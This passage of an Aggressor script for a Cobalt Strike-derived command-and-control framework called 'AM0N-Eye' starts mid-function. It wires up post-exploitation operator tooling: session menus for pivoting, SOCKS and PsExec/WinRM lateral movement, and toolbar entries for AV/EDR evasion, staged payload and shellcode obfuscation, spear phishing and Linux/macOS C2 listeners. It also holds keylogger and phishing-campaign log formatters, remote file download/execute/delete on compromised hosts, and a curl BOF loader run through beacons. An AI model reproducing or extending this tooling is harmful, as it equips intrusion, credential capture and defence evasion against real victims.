	drow_file($dialog, "payload", "Select Payload:");

	dbutton_action($dialog, "Create");
	dialog_show($dialog);
}

	


	separator();

}

popup ssh {
	item "&executable" {
		local('$bid');
		foreach $bid ($1) {
			openOrActivate($bid);
		}
	}

	menu "&Pivoting" {
		item "&SOCKS Server" {
			local('$bid');
			foreach $bid ($1) {
				openSOCKSSetup($bid);
			}
		}

		item "&Listener..." { 
			local('$bid');
			foreach $bid ($1) {
				openPivotListenerSetup($bid);
			}
		}
	}

	menu "S&ession" {
		item "&Note..." {
			# resolve the note attached to the first highlighted beacon
			local('$note');
			$note = beacon_info($1[0], "note");

			# prompt the user for a new note.
			prompt_text("Set Session Note:", $note, lambda({
				binput($bids, "note $1");
				beacon_note($bids, $1);
			}, $bids => $1));
	
		}

		item "&Remove" {
			beacon_remove($1);
		}

		item "&Exit" { 
			binput($1, "exit");
			bexit($1);
		}
	}
}

popup targets {
	menu "PsExec/WINrm" {
		# add our exploits
		local('$exploit @x');
		@x = concat(@("ssh", "ssh-key"), beacon_remote_exploits());
		foreach $exploit (sorta(@x)) {
			item($exploit, lambda({ 
				openJumpDialog($exploit, $1);  
			}, \$exploit));
		}
	}

	separator();

	# find all sessions for this host and create menus for them
	local('$beacon $user $pid');
	foreach $beacon (beacons()) {
		if ($beacon['internal'] in $1) {
			($user, $pid) = values($beacon, @('user', 'pid'));
			if (!-isactive $beacon['id']) {
				# skip sessions that are dead.
			}
			else if (-isssh $beacon['id']) {
				menu("$user", lambda({
					insert_menu("ssh", @($bid));
				}, $bid => $beacon['id']));
			}
			else {
				menu("$user $+ @ $+ $pid", lambda({
					insert_menu("beacon", @($bid));
				}, $bid => $beacon['id']));
			}
		}
	}

	item "&Scan" { openPortScanner($1); }
	item "Ser&vices" { openServiceBrowser($1); }

	insert_menu("targets_other", $1);

	separator();

	menu "&Host" {
		menu "&Operating System" {
			menu "&Windows" {
				item "1. 8/10/11/RT"    { host_update($1, $null, "Windows", 6.2, $null); }
				item "2. Vista/7"    { host_update($1, $null, "Windows", 6.0, $null); }
				item "3. XP/2003"    { host_update($1, $null, "Windows", 5.1, $null); }
				item "4. 95/98/2000" { host_update($1, $null, "Windows", 5.0, $null); }
			}	
			item "&Android"   { host_update($1, $null, "Android", 1.0, $null); }
			item "Apple &iOS" { host_update($1, $null, "Apple iOS", 1.0, $null); }
			item "&Cisco IOS" { host_update($1, $null, "Cisco IOS", 1.0, $null); }
			item "Fire&wall"  { host_update($1, $null, "Firewall", 1.0, $null); }
			item "&FreeBSD"   { host_update($1, $null, "FreeBSD", 1.0, $null); }
			item "&Linux"     { host_update($1, $null, "Linux", 1.0, $null); }
			item "&MacOS X"   { host_update($1, $null, "MacOS X", 1.0, $null); }
			item "&NetBSD"    { host_update($1, $null, "NetBSD", 1.0, $null); }
			item "&OpenBSD"   { host_update($1, $null, "OpenBSD", 1.0, $null); }
			item "&Printer"   { host_update($1, $null, "Printer", 1.0, $null); }
			item "&Solaris"   { host_update($1, $null, "Solaris", 1.0, $null); }
			item "&Unknown"   { host_update($1, $null, "Unknown", 1.0, $null); }
			item "&VMware"    { host_update($1, $null, "VMware", 1.0, $null); }
		
		}

		item "&Name..." { 
			prompt_text("Set Name of Host(s):", "", lambda({
				host_update($bids, $1, $null, 0.0, $null);
			}, $bids => $1));
		}

		item "N&ote..." { 
			prompt_text("Set Note for Host(s):", "", lambda({
				host_update($bids, $null, $null, 0.0, $1);
			}, $bids => $1));
		
		}

		separator();
		item "&Remove" { host_delete($1); }
	}
}

#
# setup our toolbar too!
#
toolbar(image_internal("resources/cc/black/png/55566.png"), "Exploitation Listeners", { 	$dialog = dialog("AM0N-Eye New Exploitation Listeners", %(listener => "Listener: ", payload_type => "Payload Type: ", Output => "Output: "), &Staged_Output);
	dialog_description($dialog, "This package generates a new exploitation listeners & beacons");
	drow_listener_smb($dialog, "listener", "Add-Listener: ");
    	dialog_show($dialog);
     });
toolbar(image_internal("resources/cc/black/png/cog_icon&16.png"), "AV/EDR Evasion", { ScareCrow(); });
toolbar(image_internal("resources/cc/black/png/contact_card_icon&16.png"), "Staged Payload Generator", { payloadgeneratestaged(); }); 
toolbar(image_internal("resources/cc/black/png/storm.png"), "Linux & MacOS Bind tcp-C2", {  createC2ServerListener(); });
toolbar(image_internal("resources/cc/black/png/masscan.png"), "C2-Server Web Delivery", { createC2ServerScript(); });
toolbar(image_internal("resources/cc/black/png/living-dead.png"), "Linux & MacOS HTTPS-C2", { createC2ServerListener(true) });
toolbar(image_internal("resources/cc/black/png/kali-powersploit.png"), "Shellcode Obfuscatior", { generate_shellcode(); });
toolbar(image_internal("resources/cc/black/png/cloud_icon&16.png"), "Spear Phish", { openSpearPhishDialog(); });
#
# redefine what some things look like.
#

# chat messages in event log

# from, text, when
set EVENT_PUBLIC {
	if (mynick() eq $1) {
		return "\cF" . dstamp($3) . " \c6<\c0 $+ $1 $+ \c6>\cF $2";
	}
	else if (mynick() isin $2) {
		return "\cF" . dstamp($3) . " \c6<\c8 $+ $1 $+ \c6>\cF $2";
	}
	else {
		return "\cF" . dstamp($3) . " \c6<\cF $+ $1 $+ \c6>\cF $2";
	}
}

# from, to, text, when
set EVENT_PRIVATE {
	if (mynick() eq $1 && mynick() eq $2) {
		return "\cF" . dstamp($4) . " \cE-> [\cB $+ $1 $+ \cE]\cF $3 $+ \n" .
		       "\cF" . dstamp($4) . " \cE<- [\c9 $+ $1 $+ \cE]\cF $3";
	}
	else if (mynick() eq $1) {
		return "\cF" . dstamp($4) . " \cE-> [\cB $+ $2 $+ \cE]\cF $3";
	}
	else if (mynick() eq $2) {
		return "\cF" . dstamp($4) . " \cE<- [\c9 $+ $1 $+ \cE]\cF $3";
	}
}

# from, text, when
set EVENT_ACTION {
	# I sent the action
	if (mynick() eq $1) {
		return "\cF" . dstamp($3) . " \c6*\c0 $1 \cF $+ $2";
	}
	# someone else sent the action
	else {
		return "\cF" . dstamp($3) . " \c6*\cF $1 $2";
	}
}

# from, when
set EVENT_JOIN {
	return "\cF" . dstamp($2) . " \c3***\c9 $1 \c3has joined.";
}

# from, when
set EVENT_QUIT {
	return "\cF" . dstamp($2) . " \cA***\cB $1 \cAhas left.";
}

# text, when
set EVENT_NOTIFY {
	return "\cF" . dstamp($2) . " \c7*** $1";
}

# from, text, when
set EVENT_NEWSITE {
	return "\cF" . dstamp($3) . " \c7*** $1 $2";
}

# to, when
set EVENT_NOUSER {
	return "\cF" . dstamp($2) . " \c5***\c4 $1 \c5is not here.";
}

set EVENT_BEACON_INITIAL {
	return "\cF" . dstamp($2) . " \c7*** initial beacon from\c8 $1";
}

set EVENT_SSH_INITIAL {
	return "\cF" . dstamp($2) . " \c7*** new ssh session\c8 $1";
}

# @users
set EVENT_USERS {
	local('$out $user');
	$out  = "\n\cF Users\n";
	$out .= "\cE -----\n";
	foreach $user ($1) {
		$out .= "\cF $user $+ \n";
	}

	return $out;
}

set EVENT_SBAR_LEFT {
	return "[" . tstamp(ticks()) . "] " . mynick(); 
}

set EVENT_SBAR_RIGHT {
	return "[lag: $1 $+ ]";
}

# weblog

# method, uri, addr, ua, response, size, handler, when
set WEB_HIT {
	local('$out $now $method $uri $addr $ua $response $size $handler $when $params');
	($method, $uri, $addr, $ua, $response, $size, $handler, $params, $when) = @_;

	$now  = dstamp($when);
	$out  = "$now visit from\cE:\o $addr $+ \n";
	$out .= "\tRequest\cE:\o $method $uri $+ \n";

	if ($handler ne "") {
		$out .= "\t $+ $handler $+ \n";
	}
	else {
		$out .= "\tResponse\cE:\c4 $response $+ \n";
	}

	$out .= "\t $+ $ua $+ \n";

	if (size($params) > 0) {
		local('$key $value');

		$out .= "\t= Form Data=\n";

		foreach $key => $value ($params) {
			$out .= "\t $+ $[10]key = $value $+ \n";
		}
	}

	return "$out $+ \n";
}

set PROFILER_HIT {
	local('$out $app $ver');
	
	$out = "\c9[+]\o $1 $+ / $+ $2 [ $+ $5 $+ ] Applications";
	foreach $app => $ver ($4) {
		$out .= "\n\t $+ $[25]app $ver";
	}

	return "$out $+ \n\n";
}

set KEYLOGGER_HIT {
	local('$date $data $r $d $f');
	$date = formatDate('yyyy-MM-dd HH:mm:ss Z');
	$data = split(',', $3);

	foreach $d ($data) {
		if ($d eq '8') {
			$r .= '<DEL>';
		}
		else if ($d eq '9') {
			$r .= '<TAB>';
		}
		else if ($d eq '13' || $d eq '10') {
			$r .= '<ENTER>';
		}
		else if ($d ne "") {
			$f = chr(formatNumber($d, 16, 10));
			$r .= $f;
		}
	}

	return "\c9[+]\o $2 [ $+ $4 $+ ] Keys $1 $+ : $r $+ \n";
}

# beacon console

# beaconid, %meta
set BEACON_SBAR_LEFT {
	local('$computer $user $pid $barch');
	($computer, $user, $pid, $barch) = values($2, @('computer', 'user', 'pid', 'barch'));
	if ("x86" eq $barch) {
		return "[ $+ $computer $+ ] $user $+ / $+ $pid";
	}
	else if ("x64" eq $barch) {
		return "[ $+ $computer $+ ] $user $+ / $+ $pid \cE(x64)\o";
	}
	else {
		return "";
	}
}

# beaconid, %meta
set BEACON_SBAR_RIGHT {
	if ($2['note'] ne "") {
		return "\c2" . $2['note'] . "  \olast: " . $2['lastf'] . " ";
	}
	else {
		return "last: " . $2['lastf'] . " ";
	}
}

# beaconid, message
set BEACON_CHECKIN {
	return "\c9[+]\o " . strrep($2, ':', "\cE:\o");
}

# beaconid, error
set BEACON_ERROR {
	return "\c4[-]\o " . strrep($2, ':', "\cE:\o");
}

# beaconid, whatever: meh
set BEACON_TASKED {
	return "\cC[*]\o " . strrep($2, ':', "\cE:\o");
}

# beaconid, whatever: meh too
set BEACON_OUTPUT {
	return "\c9[+]\o " . replace($2, "([a-z]):\n", "\$1\cE:\n\o", 1);
}

# beaconid, whatever: meh too
set BEACON_OUTPUT_ALT {
	return "\cC[*]\o " . strrep($2, ":\n", "\cE:\n\o");
}

# output for the ps command too
set BEACON_OUTPUT_PS {
	local('$out $temp $name $ppid $pid $arch $user $session @ps');
	$out .= "\cC[*]\o Process List\n\n";
	$out .= " PID   PPID  Name                         Arch  Session     User\n";
	$out .= "\cE ---   ----  ----                         ----  -------     -----\n";

	foreach $temp (split("\n", ["$2" trim])) {
		($name, $ppid, $pid, $arch, $user, $session) = split("\t", $temp);
		push(@ps, %(pid => $pid, entry => " $[5]pid $[5]ppid $[28]name $[5]arch $[11]session $user"));
	}

	# sort the processes please
	sort({ return $1['pid'] <=> $2['pid']; }, @ps);

	# append to our outstring
	foreach $temp (@ps) {
		$out .= $temp['entry'] . "\n";
	}

	return $out;
}

# output for the ls command
set BEACON_OUTPUT_LS {
	local('$out @results $cwd $entry $type $size $modified $name');
	@results = split("\n", ["$2" trim]);

	$cwd = left(shift(@results), -1);	# first entry is the current folder

	# parse/process results
	foreach $entry (@results) {
		($type, $size, $modified, $name) = split("\t", $entry);
		if ($type eq "F") {
			$entry = %(type => "fil", size => format_size($size), modified => $modified, name => $name);
		}
		else if ($type eq "D" && $name ne "." && $name ne "..") {
			$entry = %(type => "dir", size => "", modified => $modified, name => $name);
		}
		else {
			remove();
		}
	}

	# sort in alpha order with dir listings on top.
	sort({ return ($1['type'] . lc($1['name'])) cmp ($2['type'] . lc($2['name'])); }, @results);

	$out .= "\cC[*]\o Listing: $cwd $+ \n\n";
	$out .= " Size     Type    Last Modified         Name\n";   
	$out .= "\cE ----     ----    -------------         ----\n";

	foreach $entry (@results) {
		($type, $size, $modified, $name) = values($entry, @('type', 'size', 'modified', 'name'));
		$out .= " $[8]size $[7]type $[21]modified $name $+ \n";
	}

	return $out;
}

# output for the jobs command too
set BEACON_OUTPUT_JOBS {
	local('$out $temp $jid $pid $desc');
	$out .= "\cC[*]\o Jobs\n\n";
	$out .= " JID  PID   Description\n";
	$out .= "\cE ---  ---   -----------\n";

	foreach $temp (split("\n", ["$2" trim])) {
		($jid, $pid, $desc) = split("\t", $temp);
		$out .= " $[4]jid $[5]pid $desc $+ \n";
	}

	return $out;
}

set BEACON_OUTPUT_DOWNLOADS {
	local('$out $entry $name $path $size $rcvd $pct');
	$out .= "\cC[*]\o Downloads\n\n";
	$out .= " Name               Size    Received        Path\n";
	$out .= "\cE ----               ----    --------        ----\n";
	
	foreach $entry ($2) {
		($name, $path, $size, $rcvd) = values($entry, @("name", "path", "size", "rcvd"));
		$pct  = round((double($rcvd) / $size) * 100.0, 1) . '%';
		$size = format_size($size);
		$rcvd = format_size($rcvd);
		$rcvd = "$rcvd ( $+ $pct $+ )";

		$out .= " $[18]name $[7]size $[15]rcvd $path $+ \n";
	}

	return $out;
}

set BEACON_OUTPUT_EXPLOITS {
	local('$out $exp $desc');

	$out  = "\n";
	$out .= "Beacon Local Exploits\n";
	$out .= "\cE=====================\n\n";
	$out .= "    Exploit                         Description\n";
	$out .= "\cE    -------                         -----------\n";

	foreach $exp (sorta(beacon_exploits())) {
		$desc = beacon_exploit_describe($exp);
		$out .= "    $[26]exp $+ $[6]null $+ $desc $+ \n";
	}

	return $out;
}

set BEACON_OUTPUT_ELEVATORS {
	local('$out $exp $desc');

	$out  = "\n";
	$out .= "Beacon Command Elevators\n";
	$out .= "\cE========================\n\n";
	$out .= "    Exploit                         Description\n";
	$out .= "\cE    -------                         -----------\n";

	foreach $exp (sorta(beacon_elevators())) {
		$desc = beacon_elevator_describe($exp);
		$out .= "    $[26]exp $+ $[6]null $+ $desc $+ \n";
	}

	return $out;
}

set BEACON_OUTPUT_REMOTE_EXEC_METHODS {
	local('$out $exp $desc');

	$out  = "\n";
	$out .= "Beacon Remote Execute Methods\n";
	$out .= "\cE=============================\n\n";
	$out .= "    Methods                         Description\n";
	$out .= "\cE    -------                         -----------\n";

	foreach $exp (sorta(beacon_remote_exec_methods())) {
		$desc = beacon_remote_exec_method_describe($exp);
		$out .= "    $[26]exp $+ $[6]null $+ $desc $+ \n";
	}

	return $out;
}

set BEACON_OUTPUT_REMOTE_EXPLOITS {
	local('$out $exp $desc $arch');

	$out  = "\n";
	$out .= "Beacon Remote Exploits\n";
	$out .= "\cE======================\n\n";
	$out .= "    Exploit                   Arch  Description\n";
	$out .= "\cE    -------                   ----  -----------\n";

	foreach $exp (sorta(beacon_remote_exploits())) {
		$arch = beacon_remote_exploit_arch($exp);
		$desc = beacon_remote_exploit_describe($exp);
		$out .= "    $[26]exp $+ $[6]arch $+ $desc $+ \n";
	}

	return $out;
}

set BEACON_OUTPUT_HELP {
	local('$out $cmd $desc');
	$out  = "\n";
	$out .= "Beacon Commands\n";
	$out .= "\cE===============\n\n";
	$out .= "    Command                   Description\n";
	$out .= "\cE    -------                   -----------\n";

	foreach $cmd (sorta(beacon_commands())) {
		$desc = beacon_command_describe($cmd);
		$out .= "    $[26]cmd $+ $desc $+ \n";
	}

	return $out;
}

set BEACON_OUTPUT_HELP_COMMAND {
	return strrep(beacon_command_detail($1), "Use:", "Use\cE:\o");
}

set BEACON_MODE {
	return "\c9[+]\o $2";
}

# bid, from, text, when
set BEACON_INPUT {
	if ("ssh" eq beacon_info($1, "session")) {
		if ($2 eq mynick()) {
			return "\Ussh\o> $3";
		}
		else {
			return "$2 \Ussh\o> $3";
		}
	}
	else {
		if ($2 eq mynick()) {
			return "\Ubeacon\o> $3";
		}
		else {
			return "$2 \Ubeacon\o> $3";
		}
		return "$2 \Ubeacon\o> $3";
	}
}

# preamble, indicating that we're starting a phishing attack
set SENDMAIL_START {
	local('$res $victims $ntarget $attachment $bounceto $server $subject $templatef $url');
	($null, $ntarget, $attachment, $bounceto, $server, $subject, $templatef, $url) = @_;

	$res = "\cC[*]\o Starting mass email on " . formatDate('yyyy-MM-dd HH:mm:ss Z') . "\n";

	$res .= "\nPhishing Options:\n\cE=================\n\n";
	$res .= "   Option       Current Setting\n";
	$res .= "\cE   ------       ---------------\n";
	
	if ($attachment !is $null) {
		$res .= "   Attachment   $attachment $+ \n";
	}

	$victims = iff($ntarget == 1, "$ntarget target", "$ntarget targets");

	$res .= "   Bounce To    $bounceto $+ \n";
	$res .= "   Server       $server $+ \n";
	$res .= "   Subject      $subject $+ \n";
	$res .= "   Targets      $victims $+ \n";
	$res .= "   Template     $templatef $+ \n";
	$res .= "   URL          $url $+ \n\n";

	return $res;
}

set SENDMAIL_PRE {
	# email	
	return "\cC[*]\o Send Email\cE:\o $2 $+ \n"; 
}

set SENDMAIL_POST {
	# cid, email, status, message
	if ($3 eq "SUCCESS") {
		return "\t\c9SUCCESS\cE:\o $4 $+ \n";
	}
	else if ($3 eq "Failed") {
		return "\t\c4Failed\cE:\o $4 $+ \n";
	}
}

set SENDMAIL_DONE {
	return "\n\cC[*]\o Email sent on " . formatDate('yyyy-MM-dd HH:mm:ss Z') . "\n";
}

on ready {
	# register the beacon table.
	addVisualization("Session Browser", sbrowser());
        
        # register the pivot graph visualization
	addVisualization("Pivot Graph", pgraph());

	# register the target browser.
	addVisualization("Target Browser", tbrowser());

	# open the event log by default.
	openScriptConsole();
	
	show_message("                                 Welcome to AM0N-Eye	
	the hell of a Defense Based on Cyber Persistent Threat Detection.
	Don't forget to check c2 profiles to bypass network filters 
	and also check BOF a way to rapidly extend the Beacon agent
	with new post-exploitation features");
}


sub no {
	show_message("I'm not implemented yet.");
}

popup processbrowser {
	item "Set as PPID" {
		if (size($2) > 0) {
			binput($1, "ppid " . $2[0]['PID']);
			bppid($1, $2[0]['PID']);
		}
	}
}

popup filebrowser {
	item "&Copy" {
		if (size($3) > 0) {
			add_to_clipboard("$2 $+ \\" . $3[0]);
		}
	}

	item "&Download" {
		local('$file');
		foreach $file ($3) {
			binput($1, "download $2 $+ \\ $+ $file");
			bdownload($1, "$2 $+ \\ $+ $file");
		}
	}

	item "&Execute" {
		prompt_text("Arguments?", "", lambda({
			foreach $file ($files) {
				binput($bid, "execute $folder $+ \\ $+ $file" . iff($1 ne "", " $1"));
				bexecute($bid, "$folder $+ \\ $+ $file" . iff($1 ne "", " $1"));
			}
		}, $bid => $1, $folder => $2, $files => $3));
	}

	separator();

	item "D&elete" {
		local('$file @paths');
		foreach $file ($3) {
			push(@paths, "$2 $+ \\ $+ $file");
		}

		prompt_confirm("This action will delete:\n\n" . join("\n", @paths) . "\n\nPress 'Yes' to confirm this action", "SCARY ACTION!!!!", lambda({
			local('$path');
			foreach $path (@paths) {
				binput($bid, "rm $path");
				brm($bid, $path);
			}

			# force a refresh on the file browser.
			[$browser ls_refresh: $folder];
		}, \@paths, $bid => $1, $browser => $4, $folder => $2));
	}	
}

# a few commands to make the script console more interesting.
command ? {
	local('$expression $error');
	$expression = 'iff(' . substr($0, 2) . ')';
	if (checkError($error) isa ^sleep.error.YourCodeSucksException) {
		println([$error formatErrors]);
	}
	else {
		if (expr($expression)) {
			println("true");
		}
		else {
			println("false");
		}
	}
}

command x {
	local('$x $error');
	$x = expr(substr($0, 2));
	if (checkError($error) isa ^sleep.error.YourCodeSucksException) {
		println([$error formatErrors]);
	}
	else {
		println($x);
	}
}

command e {
	local('$error');
	eval(substr($0, 2));
	if (checkError($error) isa ^sleep.error.YourCodeSucksException) {
		println([$error formatErrors]);
	}
}

#
# SSH Console
#

set SSH_OUTPUT_HELP {
	local('$out $cmd $desc');
	$out  = "\n";
	$out .= "SSH Commands\n";
	$out .= "\cE============\n\n";
	$out .= "    Command                   Description\n";
	$out .= "\cE    -------                   -----------\n";

	foreach $cmd (sorta(ssh_commands())) {
		$desc = ssh_command_describe($cmd);
		$out .= "    $[26]cmd $+ $desc $+ \n";
	}

	return $out;
}

set SSH_OUTPUT_HELP_COMMAND {
	return strrep(ssh_command_detail($1), "Use:", "Use\cE:\o");
}

set SSH_SBAR_LEFT {
	local('$computer $user $pid $barch');
	($computer, $user, $pid, $barch) = values($2, @('computer', 'user', 'pid', 'barch'));
	return "[ $+ $computer $+ ] $user";
}

# beaconid, %meta
set SSH_SBAR_RIGHT {
	if ($2['note'] ne "") {
		return "\c2" . $2['note'] . "  \olast: " . $2['lastf'] . " ";
	}
	else {
		return "last: " . $2['lastf'] . " ";
	}
}

# beaconid, message
set SSH_CHECKIN {
	return "\c9[+]\o " . strrep($2, ':', "\cE:\o");
}

# beaconid, error
set SSH_ERROR {
	return "\c4[-]\o " . strrep($2, ':', "\cE:\o");
}

# beaconid, whatever: meh
set SSH_TASKED {
	return "\cC[*]\o " . strrep($2, ':', "\cE:\o");
}

# beaconid, whatever: meh too
set SSH_OUTPUT {
	return "\c9[+]\o " . replace($2, "([a-z]):\n", "\$1\cE:\n\o", 1);
}

# beaconid, whatever: meh too
set SSH_OUTPUT_ALT {
	return "\cC[*]\o " . strrep($2, ":\n", "\cE:\n\o");
}

set SSH_OUTPUT_DOWNLOADS {
	local('$out $entry $name $path $size $rcvd');
	$out .= "\cC[*]\o Downloads\n\n";
	$out .= " Name               Size    Received        Path\n";
	$out .= "\cE ----               ----    --------        ----\n";
	
	foreach $entry ($2) {
		($name, $path, $size, $rcvd) = values($entry, @("name", "path", "size", "rcvd"));
		$pct  = round((double($rcvd) / $size) * 100.0, 1) . '%';
		$size = format_size($size);
		$rcvd = format_size($rcvd);
		$rcvd = "$rcvd ( $+ $pct $+ )";

		$out .= " $[18]name $[7]size $[15]rcvd $path $+ \n";
	}

	return $out;
}

# bid, from, text, when
set SSH_INPUT {
	if ($2 eq mynick()) {
		return "\Ussh\o> $3";
	}
	else {
		return "$2 \Ussh\o> $3";
	}
}
popup beacon {
    item "Curl-TLS"{
        local('$bid');
        foreach $bid ($1){
            curl_dialog($bid);
        }
    }
}

sub curl_dialog{
    $bid = $1;
    $dialog = dialog("Curl-TLS", %(
    	HTTPMethod => "GET", 
    	Host => "", 
    	Port => "",
    	UserAgent => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36", 
    	Headers => "Accept: */*", 
    	Body => "", 
    	Proxy => "true",
		Print => "false"
    ), lambda({
        btask($bid, 'Executing Simple Web Request Utility @ajpc500');

       	$barch  = barch($bid);

        $printoutput = 0;
		if ($3["Print"] eq "true"){
			$printoutput = 1;
		}

		$proxy = 0;
		if ($3["Proxy"] eq "true"){
			$proxy = 1;
		}

		$args = bof_pack($bid, "zizizzzi", 
			$3["Host"], 
			$3["Port"], 
			$3["HTTPMethod"], 
			$printoutput, 
			$3["UserAgent"], 
			$3["Headers"], 
			$3["Body"],
			$proxy
		);
        
		$handle = openf(script_resource("curl. $+ $barch $+ .o"));
		$data   = readb($handle, -1);
		closef($handle);

        # execute it.
       	beacon_inline_execute($bid, $data, "go", $args); 
    }));

    dialog_description($dialog, "Executing Simple Web Request.\nAdd 'https://' prefix for TLS.\nHeaders separated by new lines.");
    drow_combobox($dialog, "HTTPMethod", "HTTP Method ", @("GET", "POST", "PUT", "PATCH", "DELETE"));
    drow_text($dialog, 'Host', 'Host ');
    drow_text($dialog, 'Port', 'Port ');
    drow_text($dialog, 'UserAgent', 'User-Agent ');
    drow_text_big($dialog, 'Headers', 'Headers ');
    drow_text_big($dialog, 'Body', 'Body ');
    drow_checkbox($dialog, 'Proxy', 'Autodetect Proxy ');
	drow_checkbox($dialog, 'Print', 'Print Response ');
    dbutton_action($dialog, "Run");
    dialog_show($dialog);
}


beacon_command_register(
"curl", 
"Performs a web request against target server and port",
"curl host [port] [method] [--show] [useragent] [headers] [body] [--noproxy]");

alias curl {
	local('$barch $handle $data $args');

	if(size(@_) < 2)
	{
		berror($1, "Incorrect usage!");
		berror($1, beacon_command_detail("curl"));
		return;
	}

	# figure out the arch of this session
	$barch  = barch($1);
	
	# read in the right BOF file
	$handle = openf(script_resource("curl. $+ $barch $+ .o"));
	$data   = readb($handle, -1);
	closef($handle);

	$printoutput = 0;
	if ($5 eq "--show"){
		$printoutput = 1;
	}
	
	$proxy = 1;
	if ($5 eq "--noproxy"){
		$proxy = 0;
	}

	if (size(@_) >= 4){
		if (($4 ne "GET") && 
			($4 ne "POST") && 
			($4 ne "PUT") && 
			($4 ne "PATCH") && 
			($4 ne "DELETE"))
		{
			berror($1, "HTTP method  $+ $4 $+  isn't valid.");
			berror($1, beacon_command_detail("curl"));
			return;
		}
	}

	if(size(@_) == 2)
	{
		# pack our arguments
		$args = bof_pack($1, "zizizzzi", $2, 0, "GET", $printoutput, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36", "Accept: */*", "", $proxy);
	
	}else if(size(@_) == 3)
	{
		# pack our arguments
		$args = bof_pack($1, "zizizzzi", $2, $3, "GET", $printoutput, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36", "Accept: */*", "", $proxy);
	
	} else if(size(@_) == 4)
	{

		# include method
		$args = bof_pack($1, "zizizzzi", $2, $3, $4, $printoutput, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36", "Accept: */*", "", $proxy);
	
	} else if(size(@_) == 5)
	{
		# include print option
		$args = bof_pack($1, "zizizzzi", $2, $3, $4, $printoutput, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36", "Accept: */*", "", $proxy);
	} else if(size(@_) == 6)
	{
		# include useragent
		$args = bof_pack($1, "zizizzzi", $2, $3, $4, $printoutput, $6, "Accept: */*", "", $proxy);
	} else if(size(@_) == 7)
	{
		# include headers
		$args = bof_pack($1, "zizizzzi", $2, $3, $4, $printoutput, $6, $7, "", $proxy);
	} else if(size(@_) == 8)
	{
		# include body
		$args = bof_pack($1, "zizizzzi", $2, $3, $4, $printoutput, $6, $7, $8, $proxy);
	} else if(size(@_) == 9)
	{
		# include proxy choice
		$args = bof_pack($1, "zizizzzi", $2, $3, $4, $printoutput, $6, $7, $8, $proxy);
	}

	# announce what we're doing
	btask($1, "Running Simple Web Request Utility (@ajpc500)");

	# execute it.
	beacon_inline_execute($1, $data, "go", $args);
}
